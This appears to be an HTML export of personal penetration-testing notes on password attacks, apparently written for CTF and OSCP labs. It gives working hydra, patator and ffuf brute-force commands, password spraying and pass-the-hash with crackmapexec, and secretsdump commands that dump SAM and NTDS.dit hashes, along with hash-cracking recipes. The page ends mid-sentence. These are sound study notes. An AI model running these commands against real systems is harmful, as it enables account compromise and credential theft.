<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Password Attack</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Password Attack</h1><br/><p><h1>Methodology</h1><ul><li><span style="color:#ff0000;">Create 3 lists</span>, with: <span style="color:#33d17a;">credential pairs </span>(&amp; note where they were used), <span style="color:#33d17a;">usernames</span>, <span style="color:#33d17a;">passwords</span>. Different accounts may have the same password.  Incl <span style="color:#ff0000;">uppercase &amp; lowercase names</span> for Usernames! </li></ul></p><p><ul><li>Be mindful of account lockouts. If lockout policies are in effect, and there is no other option than a Password Attack, <span style="color:#ff0000;">start with valid cred pairs</span> that worked on other targets.</li></ul></p><p> </p><p>Using only 1-2 passwords for <span style="color:#1c71d8;">Password Spraying </span>will be unlikely to cause lockout, unless previous attacks have increased the “Fail Count”.</p><p><ul><li>★ Try <span style="color:#ff0000;">using the username as the password</span>.</li></ul></p><p><ul><li>BF with multiple wordlists. Try Seclists def logins, fasttrack, rockyou, etc.</li></ul></p><p><ul><li>Some creds will <span style="color:#ff0000;">only work against a specific service</span> (e.g. the <strong>sa</strong> user for MSSQL) &amp; won&#39;t be a normal user account (e.g. it&#39;ll fail against SMB). Test creds against services &amp; user accounts.</li></ul></p><p></p><p><h2>Choosing Service to BF</h2></p><p><h3>Factors to Consider</h3></p><p><span style="color:#8ff0a4;text-decoration:underline;">Authentication Mechanism</span>: Be mindful of how a SVC handles authentication, since some are tied to an OS Account &amp; will have the same creds.</p><p></p><p>For example, a Web App login may / may not be the same creds that a user uses to sign into the machine (you still may need to BF it).</p><p></p><p>However, signing into SMB &amp; RDP should use the same creds as an OS Account (assuming that user can RDP).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Speed &amp; Load Tolerance</span>: You should also consider the speed at which you can BF any given SVC, &amp; the load you&#39;re placing on it (some SVCs may tolerate a higher load even if they&#39;re running on the same machine).</p><p></p><p>For instance, if you&#39;re trying to find creds for an OS Account, SMB is better than RDP because it&#39;s faster to BF &amp; will work regardless of the user&#39;s group permissions.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Account Lockout</span>: Technically any SVC could have a lockout policy. However in practice, the target may not have implemeted these measures across all SVCs.</p><p></p><p>Even if each SVC has a lockout policy, some may be more restrictive than others. Some may trigger after fewer failed attempts, or have a longer lockout time (they may even ban your IP, forcing you to use something like a Proxy).</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Available Tools</span>: Another factor to take into account, is what tools you can use to BF the available SVCs. Some tools work faster &amp; / or more reliably than others.</p><p></p><p>For instance, <strong>nxc</strong> is often more reliable than <strong>hydra</strong> for SMB, as <strong>hydra</strong> sometimes has issues depending on the server&#39;s supported SMB versions.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: If you&#39;re using a Proxy or trying to LotL, your choice of tools could be limited (see <a href="Pivoting_22.html#Protocols & the OSI Model">Protocols &amp; the OSI Model</a>). </p><p></p><p><h2>Testing Creds Against Services</h2></p><p>Test a list of cred pairs against a list of targets for supported protocols like-</p><p></p><p><em>hydra -C creds.txt -M targets.txt rdp</em></p><p></p><p><h3>Supported Protocols</h3></p><p>*Should* work for protocols like FTP, RDP, SMTP, SSH, &amp; some SQL languages. (I haven&#39;t tested them all)</p><p></p><p>My version of <span style="color:#ff0000;">hydra won&#39;t work for SMBv2</span>. Use <span style="color:#ff0000;">CME to test SMB</span> (&amp; *should* work for WinRM, but I haven&#39;t tested it).</p><p><span style="color:#ffbe6f;"></span></p><p><span style="color:#ffbe6f;"></span><h1>Default Credentials</h1></p><p>There <span style="color:#ff0000;">may be &gt;1 set of default creds</span> for any given version. Even if 1 set of def creds don&#39;t work, another set may (i.e diff ver may&#39;ve diff def creds, or there could be diff creds for diff priv lvls like admin &amp; guest)</p><p></p><p><a name="WebApp Brute Force"></a><h1>Brute Forcing Web Apps</h1></p><p></p><p><h2>HTTP Basic Auth</h2><h2></h2></p><p><h2></h2>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: Both <span style="color:#ff0000;">hydra &amp; patator FAILED to ID valid creds</span>! Was it a problem with the WebApp at the time? I feel like this worked before? I had to manually sign in with creds these tools determined to be invalid!</p><p></p><p><h3>patator</h3></p><p>By def, patator won&#39;t stop after finding valid credentials &amp; it may be hard to quickly find them out of the errors in the output.</p><p></p><p>One solution is to tell patator to quit when a status code(s) is returned. <strong>-x</strong> can be passed multiple times. 200 is success, but maybe also try HTTP Status Codes for redirect?</p><p></p><p><em>patator http_fuzz auth_type=basic url=http://login.relia.com user_pass=mark:FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:code=401</em> <em>-x quit:code=200</em></p><p></p><p><em>patator http_fuzz auth_type=basic url=http://login.relia.com user_pass=FILE0:FILE1 0=./usernames.txt 1=/usr/share/wordlists/rockyou.txt -x ignore:code=401 -x quit:code=200</em><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><span style="color:#8ff0a4;text-decoration:underline;">Routing Through a Proxy</span>: You can setup Chisel &amp; either user <strong>proxychains</strong>, or the built-in proxy functionality.</p><p></p><p><em>patator http_fuzz auth_type=basic url=http://127.0.0.1:8000 user_pass=FILE0:&#39;P4ssw0rdS0pRi0T3c&#39; 0=/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -x ignore:code=401 -x quit:code=200 proxy=localhost:1080 proxy_type=socks5</em><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><h3>hydra</h3></p><p><span style="color:#663e0e;"></span></p><p><span style="color:#663e0e;"></span><em>hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V -s 11025 admin.ironcorp.me http-get &#39;/&#39;</em></p><p></p><p><em>hydra -l lisa -P /usr/share/wordlists/rockyou.txt -f -V -s 8080 IP http-get &#39;/manager/html&#39;</em></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Routing Through a Proxy</span>: You can setup Chisel &amp; use proxychains.</p><p></p><p><em>proxychains hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p &#39;P4ssw0rdS0pRi0T3c&#39; -f -V -s 8000 localhost http-get &#39;/&#39;</em></p><p><h2></h2></p><p><h2>Site takes JSON</h2></p><p><h3>ffuf</h3></p><p>ffuf may be easier to use than hydra. Instead of specifying a traditional fail condition, run a baseline test &amp; filer (e.g. for Resp Length) to exclude failed attempts.</p><p></p><p><em>ffuf -c -u &quot;http://pig.thm/api/login&quot; -X POST -w wordlist.txt -H &quot;User-Agent: Bypass&quot; -d &quot;{\&quot;username\&quot;:\&quot;marco\&quot;,\&quot;password\&quot;:\&quot;FUZZ\&quot;}&quot; -fw 5</em></p><p></p><p><h3>hydra</h3></p><p><em>hydra -L usernames.txt -P passwds.txt -V -f -s 8000 web01.relia.com http-form-post &quot;/login:{\&quot;username\&quot;\:\&quot;^USER^\&quot;,\&quot;password\&quot;\:\&quot;^PASS^\&quot;}:F=Data error&quot;</em></p><p></p><p><em>hydra -l &#39;security@skylark.jp&#39; -P /usr/share/wordlists/rockyou.txt -f -V -s 24680 192.168.250.226 http-form-post &quot;/umbraco/backoffice/umbracoapi/authentication/PostLogin:{\&quot;username\&quot;\:\&quot;^USER^\&quot;,\&quot;password\&quot;\:\&quot;^PASS^\&quot;}:F=Login failed&quot;</em></p><p></p><p><h2>Hydra in Base64</h2></p><p>If intercepted Auth attempt shows creds in B64, tell hydra to encode creds in B64 with <strong>^USER64^</strong> &amp; <strong>^PASS64^</strong>. For ex-</p><p></p><p><em>hydra -L user.txt -P pass.txt -f -V -s PORT IP http-form-post ‘/service/rapture/session:username=^USER64^&amp;password=^PASS64^:C=/:F=403&#39;</em></p><p></p><p><strong>C=/</strong> means establish session cookie @ the URL<strong> /</strong></p><p></p><p><strong>F=403</strong> means a Response with the Status Code 403 is a “Failed” login attempt.</p><p></p><p><h2>Hydra with Custom Headers</h2></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Check the additional options for a hydra module (e.g. <strong>http-form-post</strong>) with<strong> hydra -U http-form-post</strong>. One of the options is to add / modify an HTTP Header.</p><p></p><p>Use Double Quotes for the string provided as the last argument, and use the following syntax to specify a header (I think).</p><p></p><p><em>:H=User-Agent\: Bypass</em></p><p></p><p><a name="Mutations"></a><h2>Mutate Wordlist</h2></p><p>Common methods of mutating a wordlist are using a rule set from <strong>john</strong>, or with <strong>crunch</strong> (what <strong>Ares</strong> uses). For more tricks, see <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Manipulating & Comparing Text">Manipulating &amp; Comparing Text</a> (e.g. prepending string to entries in a wordlist).</p><p></p><p><strong>Ares</strong> is reliable, but for example, <strong>john</strong> can be used to add 2 #&#39;s &amp; some spec char&#39;s as follows.</p><p></p><p><strong>[List.Rules: MyRule]</strong><strong></strong></p><p><strong>$[0-9] $[0-9]  $[!.$,_-]</strong></p><p></p><p><em>john -w=example_list.txt --rules=MyRule --stdout &gt; final_list.txt</em></p><p></p><p><h3>Passwords are Encoded / Hashes</h3></p><p>Some Web Apps expect the password to be in a certain format (e.g. B64 Encoded, or as a hash). View login attempts captured by burp &amp; run passwords through tools like <strong>hash-identifier</strong> &amp; <strong>hashid</strong> (<span style="color:#ff0000;">try both</span>) to determine the format.</p><p></p><p>Create a clear-text wordlist using <strong>cewl</strong> or take a normal password wordlist &amp; mutate it as needed. Use <strong>Ares</strong> to convert the clear-text entries into the desired format.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Get Clear-Text Password</span>: If passwords are hashed, &amp; you used Ares to convert the wordlist, you can get the corresponding clear-text password as follows.</p><p><ol><li>Copy the hash that worked for BF</li></ol></p><p><ol><li>Open hashes wordlist with <strong>vim</strong>, search for that hash, &amp; take note of that line number (e.g. 249)</li></ol></p><p><ol><li>Open clear-text wordlist with <strong>vim</strong> &amp; <strong>Esc</strong> → <strong>:249</strong>. This jumps to line 249.</li></ol></p><p></p><p><h1>Custom Wordlists</h1></p><p><strong>rockyou2021.txt</strong> is an updated list (~90 GB?)</p><p></p><p><h2>CeWL</h2></p><p>Scrapes a website for keywords to generate a wordlist for a Dictionary Attack.</p><p></p><p>List will likely be relatively short, so it&#39;s worth trying after def logins.</p><p></p><p><span style="color:#ff0000;">Try this list for username, password, &amp; for both</span> (could be any of the 3).</p><p></p><p>Get all entries as they appear, but <span style="color:#ff0000;">also in lowercase</span> format.</p><p></p><p><em>cewl http://IP --with-numbers -e -d 4 | grep -v CeWL &gt;&gt; list.txt</em><em></em></p><p><em>cewl http://IP --with-numbers -e -d 4 --lowercase | grep -v CeWL &gt;&gt; list.txt</em></p><p></p><p><h3>Other Uses</h3></p><p>CeWL wordlists can also be used for-</p><p><ol><li> subdir enum</li><li>subdom enum</li><li>obtaining email addresses (e.g for Client Side Attacks)</li></ol></p><p></p><p><h2>Crunch</h2></p><p>[OSCP 160] OSWP notes?</p><p></p><p>Generate a wordlist for a Brute Force Attack (testing all permutations of a charset for a password of a given length), or mutate a wordlist for a Dictionary Attack.</p><p></p><p>For example, to generate a password with a minimum &amp; maximum length of 6 that starts with “Lab” &amp; ends with 3 numbers:</p><p></p><p><em>crunch 6 6 -t Lab%%% &gt; wordlist.txt</em></p><p></p><p><h2>CUPP</h2></p><p>[CTF D 11]</p><p></p><p><a href="https://github.com/Mebus/cupp">CUPP</a> (Common User Passwords Profiler) is a unique tool for generating wordlists. Use the <strong>-i</strong> arg for interactive mode.</p><p></p><p>You&#39;re prompted to provide as much personal info about the target account as possible, &amp; that information is used to generate a list of likely passwords. You can leave any fields blank if you don&#39;t know what to put there.</p><p></p><p>For example, it uses Birthdays, Pet Names, Addresses, Parter Names, etc.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: By default, it tries to write the wordlist file to <strong>/usr/share/cupp</strong>. Either run it with <strong>sudo</strong> (so you have R/W perms), or edit the script to change the destination directory.</p><p></p><p><a name="KeePass"></a><h1>KeePass</h1></p><p>Find <a href="PrivEsc--Windows_9.html#Password Manager">master password</a> for DB by extracting hash &amp; then cracking it.</p><p></p><p><em>keepass2john Database.kdbx &gt; Database.hash</em></p><p></p><p>{Linux} <em>keepass2</em> 	File → Open (Database.kdbx using master password)</p><p></p><p>The Database<span style="color:#ff0000;"> may have multiple Subdirs/Files</span>, each with diff creds! Check them all!</p><p></p><p> R Click entry &amp; “Copy Password” or view with R click “Edit Entry”  → Click next to the password •••</p><p></p><p><h2>Change Setting to Prevent Auto-loading Keyfile</h2></p><p>When keepass2 is loaded, it&#39;ll try to open the last Master Key .kdbx file by def, &amp; requires you to unlock it to continue. Disable this action by opening keepass2 &amp; a .kdbx file then</p><p></p><p>Tools  → Options  → Advanced  →  uncheck &quot;Remeber &amp; Open Last Used...&quot;</p><p></p><p><a name="Registry Hashes"></a><h1>Windows Dumping Registry Hashes</h1></p><p>[CTF B 49]</p><p>Use <a href="https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets">registry hives</a> to dump local creds from SAM &amp;/or domain cached creds from SECURITY by using SYSTEM to decrypt them.</p><p></p><p>Sometimes creds for a <span style="color:#ff0000;">Domain Admin</span> Acct will be saved in the <span style="color:#ff0000;">SAM</span> file.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: If you find a backup that contains hives, &amp; some of the hashes aren&#39;t currently used by the account, check for password re-use (i.e by spraying). Can also try simple mutations in case their new password is similar.</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>★: There are multiple methods for attacking Registry Hives &amp; they work differently! For ex, <strong><span style="color:#ff0000;">impacket-secretsdump</span></strong><span style="color:#ff0000;"> may fail where </span><strong><span style="color:#ff0000;">impacket-reg</span></strong><span style="color:#ff0000;"> doesn&#39;t</span>! Try them all!</p><p></p><p><h2>Using Backup Operators Group / SeBackupPrivilege</h2></p><p>[Win 50]</p><p><a href="PrivEsc--Windows_9.html#SeBackupPrivilege">Backing up Hives</a> is NOT the same as <strong>impacket-secretsdump</strong> method. Works best when manually copying each target file.</p><p></p><p><h2>Locally</h2></p><p></p><p><em>impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL</em><em></em></p><p><em>impacket-secretsdump -security ./SECURITY -system ./SYSTEM LOCAL</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: impacket-secretsdump output may have <span style="color:#ff0000;">NTLM hashes overflowing into the next line</span>! Ensure you&#39;re using the WHOLE hash!</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: May also be able to run impacket-secretsdump remotely to avoid having to Exfil files!</p><p></p><p><h3>Troubleshooting</h3></p><p>★<span style="color:#f66151;text-decoration:underline;">IMPORTANT</span>★: Sometimes fails with <strong>[-] read length must be non-negative or -1</strong>. <span style="color:#ff0000;">Re-running tool</span> 12 times w/o any changes worked? Is there a bug in this version of <strong>impacket-secretsdump</strong>?</p><p></p><p>Try <span style="color:#ff0000;">running multiple times</span>, &amp; try getting <span style="color:#ff0000;">new copy of Hive files</span> in case current files are corrupted.</p><p></p><p><h2>Active Directory</h2></p><p>Retrieve <span style="color:#ff0000;">NTDS.dit</span> for all Domain hashes, &amp; use SYSTEM to decrypt the file. 2 ways to get NTDS.dit</p><p><ol><li>Use DCSync [Win 25-26, 99] on any host in the domain.</li></ol></p><p><ol><li>Leverage RCE on a DC with <a href="PrivEsc--Windows_9.html#SeBackupPrivilege">SeBackupPrivilege</a> / Membership in <strong>Backup Operators</strong> Group to backup the DC&#39;s FS.</li></ol></p><p></p><p><em>impacket-secretsdump -ntds ntds.dit -system system local</em></p><p></p><p><h3>Disk Shadow</h3></p><p>See <a href="PrivEsc--Windows_9.html#DiskShadow Hives">Notes</a></p><p></p><p><h2>Output NTLM to File</h2></p><p>Good practice to <span style="color:#ff0000;">output to STDOUT initially</span>, to see which hashes belong to which user &amp; ensure you aren&#39;t missing anyting by filtering the text.</p><p></p><p>NTLM hashes are under <strong>Domain Credentials</strong> &amp; output in the syntax - <strong>domain\uid:rid:lmhash:nthash</strong></p><p></p><p>Therefore, filter for the 4th<strong> :</strong> to extract NTLM / NT hashes. </p><p></p><p><em>impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL | awk -F &quot;:&quot; &#39;{print $4}&#39; &gt; hashdump.txt</em></p><p></p><p><h3>In AD</h3></p><p>The output will also incl <strong>Kerberos keys</strong> with a diff syntax. The dumpfile will contain empty lines for these. Can either-</p><p><ol><li>Use <em>vim</em> to Delete these empty lines (there may be hundreds, but clicking and dragging + <strong>Delete</strong> is pretty efficient).</li></ol></p><p><ol><li>Copy / Paste the NTLM hashes into a file instead of redirecting all output with <strong>&gt;</strong>.</li></ol></p><p></p><p><h3>Use Cases</h3></p><p>It&#39;s <span style="color:#ff0000;">best to get clear-text passwords</span> via Rainbow Table (e.g crackstation) or by cracking. A list of hashes can be used for both of these, but can take an extemely long time to parse! Quicky password spray clear-text creds with <a href="PrivEsc--Windows--Active_Directory_10.html#KRB passwd spray">Kerbrute</a>.</p><p></p><p>If you can&#39;t get clear-text passwords, use the file for a <span style="color:#ff0000;">Password Spraying + PtH</span> combo. </p><p></p><p><h3>PtH Spraying</h3></p><p>Attack SMB (e.g Using CME). It&#39;ll be very slow (maybe another tool is quicker?).</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: This can cause lockout if that&#39;s enabled!</p><p></p><p><em>crackmapexec smb 10.10.96.25 -u users.txt -H hashdump.txt</em></p><p></p><p><h2>Remotely</h2></p><p>[CTF2 50]</p><p>If you have access to an account with sufficient privileges (e.g. a Machine Account) you may be able to extract hashes with the following. <span style="color:#ff0000;">If it doesn&#39;t work, try </span><strong><span style="color:#ff0000;">impacket-reg</span></strong><span style="color:#ff0000;"> &amp;/or local methods</span>! </p><p></p><p><em>impacket-secretsdump medtech.com/&#39;DC01$&#39;@DC_IP -hashes :NTLM</em></p><p></p><p><h3>Failed Syntax</h3></p><p><span style="color:#060f94;">★ </span><span style="color:#060f94;text-decoration:underline;">Warning</span>: <span style="color:#ff0000;">Diff creds dumped</span> when run remotely <span style="color:#ff0000;">as opposed to</span> downloading &amp; <span style="color:#ff0000;">running locally</span>. It tried dumping creds normally using admin creds, &amp; didn&#39;t parse the exfil&#39;ed Hives I specified.</p><p></p><p>The <span style="color:#ff0000;">below command DIDN&#39;T WORK</span> as intended (because it&#39;s attempting a diff Attack)!</p><p></p><p><em>impacket-secretsdump ms01/Administrator:December31@192.168.185.147 -sam \\setup\\SAM.bak -system \\setup\\SYSTEM.bak</em></p><p></p><p><h2>Obtaining Registry Hives</h2></p><p>Often somehow related to backups. If there is a  <span style="color:#ff0000;">backup dir</span>, it <span style="color:#ff0000;">could contain Registry Hives</span> saved to files.</p><p></p><p><span style="color:#ff0000;">Certain privs / groups allow you to create backups</span>, &amp; these can be used to extract the hives.</p><p></p><p><h3>Locate Backups</h3></p><p>You can use CMD to enumerate <a href="PrivEsc--Windows_9.html#Backed up Hives">backed-up hives</a>.</p><p></p><p>★<span style="color:#f66151;text-decoration:underline;">WARNING</span>★: A previously backed-up hive <span style="color:#ff0000;">MAY NOT have the current hash</span> for some users!</p><p></p><p><h2>Exfiltrate Files</h2></p><p>If you&#39;re operating through a tunnel, may be easiest to use impacket-psexec for <a href="PrivEsc--Windows--RCE_33.html#impacket-psexec file transfer">file transfers</a>.</p><p></p><p>They&#39;re large files &amp; SMB sometimes can be finicky. Should be able to use the SMB command <a href="Recon_+_Services--SMB_11.html#large files">here</a>.</p><p></p><p><h1>Brute Forcing &amp; Cracking Tools</h1></p><p><a name="nxc"></a><h2>NetExec (nxc)</h2></p><p><a href="https://www.netexec.wiki/">NetExec</a> is the replacement for CrackMapExec (CME), but they both work the same way.</p><p></p><p>Some valid credentials have the iconic <strong>(Pwn3d!)</strong> message, but what this means can vary depending on the SVC you&#39;re testing.</p><p></p><p>By default, NXC will quit after valid credentials are found. Use <strong>--continue-on-success</strong> to continue checking every username in the wordlist. It will still stop testing a username after valid credentials are found for them.</p><p></p><p><h3>SMB</h3></p><p>It&#39;s currently my preferred tool for Brute Forcing SMB. If a pair of credentials is followed by <strong>(Pwn3d!)</strong> that means the account has Local Administrator Privileges.</p><p></p><p>If you&#39;re dealing with a machine in an AD environment, you need to <span style="color:#ff0000;">check each pair of credentials 2ce</span>: Specifying the <strong>Local Hostname</strong> &amp; Specifying <strong>Domain Name</strong>.</p><p></p><p>Some credentials will work in both instances, but this isn&#39;t always the case!</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Special Characters in Wordlist</span>: You often need to use <strong>--ignore-pw-decoding</strong> for wordlists like rockyou.txt to ignore characters that aren&#39;t UTF-8. This prevents errors during BF.</p><p></p><p><h3>WinRM</h3></p><p>It showed <strong>(Pwn3d!)</strong>, but the account wasn&#39;t a Local Admin. Maybe this just means that the account has WinRM access?</p><p></p><p>It may not differentiate invalid credentials from valid creds that don&#39;t have WinRM access.</p><p></p><p><h3>RDP</h3></p><p>May / may not be able to tell you whether creds are valid regardless of whether or not the account has the privileges to use RDP.</p><p></p><p>This may / may not depend on whether Network Level Authentication is enabled (e.g. NXC may say <strong>nla: False</strong>). Maybe it&#39;d show <strong>(Pwn3d!)</strong> if the account has RDP access.</p><p></p><p><h3>LDAP</h3></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">SCCM</span>: NXC can enumerate the System Center Configuration Manager (<a href="https://www.netexec.wiki/ldap-protocol/enumerate-sccm">SCCM</a> or MEMC) in an AD environment.</p><p></p><p><h3>MSSQL</h3></p><p></p><p><h3>SSH</h3></p><p></p><p><h3>FTP</h3></p><p></p><p><h3>WMI</h3></p><p></p><p><h3>NFS</h3></p><p></p><p></p><p><h2>John the Ripper</h2></p><p><h3>Loading wordlist from RAM</h3></p><p><em>cat /tmp/wordlist.txt | john --stdin --format=raw-md5 hashfile.txt</em></p><p></p><p><h2>Hydra</h2></p><p><h3>Loading wordlist from RAM</h3></p><p>Use <a href="Appendix--Code--Shell_(Bash)_84.html#xargs">xargs</a> since hydra doesn&#39;t offer native support for redirecting from STDIN. It will pollute your terminal as each entry will be tried by itself.</p><p></p><p><em>curl http://adana.thm/announcements/wordlist.txt | xargs -I % hydra -l hakanbey01 -p % -f adana.thm ftp</em></p><p></p><p><h1>Hash Cracking</h1></p><p>Try both <strong>hash-identifier</strong> &amp; <strong>hashid</strong> when checking hashes. Both tools can fail (especially if it&#39;s salted), but they <span style="color:#ff0000;">may provide different results</span>.</p><p></p><p>If using online Rainbow Table for CTF, try &gt;1 (e.g. <a href="https://crackstation.net/">crackstation.net</a> &amp; <a href="https://hashes.com/en/decrypt/hash">hashes.com</a>). You shouldn&#39;t run a client&#39;s hashes through an online Rainbow Table, but can create a local Rainbow Table (it&#39;ll be massive).</p><p></p><p><h2>★</h2><h2>Dynamic Formats</h2><h2>★</h2></p><p>[CTF D 45-46]</p><p></p><p>John the Ripper (JtR) <span style="color:#ff0000;">can often crack salted hashes</span> without explicitly specifying a dynamic format, <span style="color:#ff0000;">if the hash format is known</span> and supported natively (e.g., for Unix passwords, MD5crypt, bcrypt, etc.).</p><p></p><p>However, <span style="color:#ff0000;">if the hash format is</span> <span style="color:#ff0000;">uncommon</span> or custom (like Gibbon’s SHA256(salt + password)), you <span style="color:#ff0000;">must use a dynamic format</span> or define a custom one.</p><p></p><p><h3>Background</h3></p><p>Dynamic formats in JtR are a powerful way to handle non-standard or custom hashing algorithms, especially those that combine salts and passwords in unique ways. They let John crack hashes even if it doesn’t have native support for that specific format.</p><p></p><p>Think of them as &quot;mini-scripts&quot; that define:</p><p><ul><li>Which hash function to use (e.g., MD5, SHA1, SHA256)</li></ul></p><p><ul><li>How to arrange the password ($p) and salt ($s)</li></ul></p><p><ul><li>Optional iterations or encodings</li></ul></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">List Dynamic Formats</span>: The following command outputs dynamic formats &amp; the algorithms that they&#39;re designed for. Full definitions can be found in <strong>john.conf</strong> or <strong>dynamic.conf</strong>.</p><p></p><p><em>john --subformat=LIST</em></p><p></p><p><a name="Define a Dynamic Format"></a><span style="color:#8ff0a4;text-decoration:underline;">Define a Dynamic Format</span>: The Dynamic Format <span style="color:#ff0000;">MAY VARY depending on</span><span style="color:#8ff0a4;"> </span>what <span style="color:#ff0000;">version of JtR</span> you&#39;re using (e.g. Jumbo, which is the version that Kali uses by default).</p><p></p><p>For example, <strong>dynamic_82</strong> is widely documented as being for sha256 but on my machine it&#39;s sha512. You NEED to verify what Dynamic Algorithms your machine uses.</p><p></p><p>Instead of using built-in names for Dynamic Formats, you can explicitly define one. The advantage to this is that the command should stay consistent regardless of your version of JtR.</p><p></p><p>For example, to define a Dynamic Format for SHA-256, you can use <strong>--format=dynamic=&#39;sha256($s.$p)&#39;</strong></p><p></p><p><h3>Example Usage</h3></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Retrieve Hash &amp; Salt</span>: Find the information that you&#39;ll need for the password hash file that JtR will crack.</p><p></p><p><em>C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p&quot;MisterGibbs!Parrot!?1&quot; -E -e &quot;select * FROM gibbon.gibbonperson;&quot;</em></p><p></p><p><strong>username: f.frizzle</strong><strong></strong></p><p><strong>passwordStrong: 067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03</strong><strong></strong></p><p><strong>passwordStrongSalt: /aACFhikmNopqrRTVz2489</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Identify Hashing Algorithm</span>: Compare the results from multiple tools like <strong>hash-identifier</strong> &amp; <strong>hashid</strong>. The hashing algorithm is sometimes misidentified. In this case, it&#39;s SHA-256.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Find the Dynamic Algorithm</span>: Instead of selecting a built-in Dynamic Format, it may be better to <span style="color:#ff0000;">explicitly </span><a href="Misc_Attacks--Password_Attack_5.html#Define a Dynamic Format">define a Dynamic Format</a>.</p><p></p><p>This tells John to use a dynamic format where the <span style="color:#ff0000;">salt is prepended</span> to the password, then hashed with SHA-256.</p><p></p><p><strong>--format=dynamic=&#39;sha256($s.$p)&#39;</strong></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: The salt always comes after the hash in your hash file. This just means that this hash was generated by prepending the salt to the password.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Hash Prefix</span>: Add the hash prefix that corresponds with your Dynamic Format. The <span style="color:#ff0000;">most reliable method</span> is to specify a specific <span style="color:#ff0000;">predefined format</span>.</p><p></p><p><em>john --subformat=LIST | grep -i &quot;sha256&quot;</em></p><p></p><p><strong>$dynamic_61$</strong></p><p></p><p>You can also try telling JtR to use the format that you explicitly specified with the previous arg, but it doesn&#39;t always work.</p><p></p><p><strong>$dynamic_custom$ </strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Hash File Syntax</span>: USERNAME<strong>:$</strong>HASH_PREFIX<strong>$</strong>HASH<strong>$</strong>SALT</p><p></p><p><strong>f.frizzle:$dynamic_61$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489</strong></p><p></p><p>OR</p><p></p><p><strong>f.frizzle:$dynamic_custom$067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03$/aACFhikmNopqrRTVz2489</strong></p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">Cracking</span></p><p></p><p><em>john --format=dynamic=&#39;sha256($s.$p)&#39; --wordlist=rockyou.txt --rules=best64 frizzle-hash.txt</em></p><p></p><p><a name="zip2john"></a><h2>zip2john</h2></p><p>See all the options with <strong>--help</strong>.</p><p>Assumes every file in the archive is using the same passwd, and if they don&#39;t the produced hash may be uncrackable. To avoid this, <span style="color:#ff0000;">use -o option to pick 1 file at a time</span>. No downside? If same passwd is used for all, you&#39;ll still crack it.</p><p></p><p>Specify <span style="color:#ff0000;">full path to an encrypted file in the archive</span> (from <em>unzip</em> output). <span style="color:#ff0000;">If files are encrypted with diff passwords</span>, you&#39;ll need to <span style="color:#ff0000;">repeat these steps for those files</span> as well!</p><p></p><p><h3>Identify an Encrypted Zip File</h3></p><p>May get a diff indicator that the file is passwd protected (see <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Unzip">Unzip</a> Notes). Sometimes you get an error like-</p><p></p><p><strong>skipping ... need PK compat. v5.1 (can do v4.6)</strong></p><p></p><p>Instead may just get a prompt asking for the passwd to a specific file in the archive, like-</p><p></p><p><strong>[experiment_gone_wrong.zip] system.hive password:</strong></p><p></p><p><h3>Single Out a File to Bully</h3></p><p>Attempt to unzip without providing a passwd, and the output will tell you what files are being “skipped.” For ex, </p><p></p><p><em>unzip /opt/backup/sitebackup3.zip</em>		(Output: <strong>skipping: joomla/configuration.php  need PK compat. v5.1 (can do v4.6)</strong>)</p><p></p><p><em>zip2john -o joomla/configuration.php archive.zip &gt; archive.hash</em></p><p></p><p><em>7z x archive.zip -aoa -p&#39;PASSWD&#39;</em>			(This was the last file of the multi-part-archive, &amp; the others weren&#39;ty needed apparently)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: No spaces between -p arg and the password!</p><p></p><p><h2>Troubleshooting</h2></p><p><h3>john-</h3><strong><h3> No password hashes left to crack</h3></strong></p><p>May mean multiple things.</p><p></p><p><span style="color:#8ff0a4;text-decoration:underline;">John cracked this hash previously</span>: john won&#39;t crack a hash that it already &quot;solved.&quot; Try running <strong>john --show</strong>. Can delete the archive of cracked hashes 